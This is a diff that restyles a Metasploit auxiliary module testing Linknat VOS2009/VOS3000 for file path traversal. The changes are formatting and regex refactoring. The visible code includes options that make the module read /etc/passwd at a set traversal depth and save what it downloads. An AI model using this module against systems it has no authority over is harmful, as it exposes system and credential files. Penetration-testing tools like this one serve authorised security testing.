@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,24 +7,23 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Linknat Vos Manager Traversal',
-      'Description' => %q(
-        This module attempts to test whether a file traversal vulnerability
-        is present in version of linknat vos2009/vos3000
-      ),
-      'References' => [
-        ['URL', 'http://www.linknat.com/'],
-        ['URL', 'http://www.wooyun.org/bugs/wooyun-2010-0145458']
-      ],
-      'Author'         => ['Nixawk'],
-      'License'        => MSF_LICENSE))
+                      'Name'        => 'Linknat Vos Manager Traversal',
+                      'Description' => %q(
+                        This module attempts to test whether a file traversal vulnerability
+                        is present in version of linknat vos2009/vos3000
+                      ),
+                      'References' => [
+                        ['URL', 'http://www.linknat.com/'],
+                        ['URL', 'http://www.wooyun.org/bugs/wooyun-2010-0145458']
+                      ],
+                      'Author'         => ['Nixawk'],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
@@ -31,7 +31,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The path of Linknat Vos Manager (/chs/, /cht/, /eng/)', '/eng/']),
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 5])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def vos_uri(path)
@@ -57,8 +58,8 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{js_uri} - HTTP/#{res.proto} #{res.code} #{res.message}")
 
     return unless res.code == 200
-    res.body =~ /s\[8\] = \"([^"]*)\"/m ? major = $1 : major = nil
-    res.body =~ /s\[169\] = \"[^:]*: ([^"\\]*)\"/m ? minor = $1 : minor = nil
+    major = res.body =~ /s\[8\] = \"([^"]*)\"/m ? Regexp.last_match(1) : nil
+    minor = res.body =~ /s\[169\] = \"[^:]*: ([^"\\]*)\"/m ? Regexp.last_match(1) : nil
     "#{major} #{minor}"
   end
 
@@ -84,7 +85,8 @@ class MetasploitModule < Msf::Auxiliary
         'text/plain',
         ip,
         res.body,
-        filename)
+        filename
+      )
       print_good("#{full_uri} - File saved in: #{path}")
     else
       print_error("#{full_uri} - Nothing was downloaded")
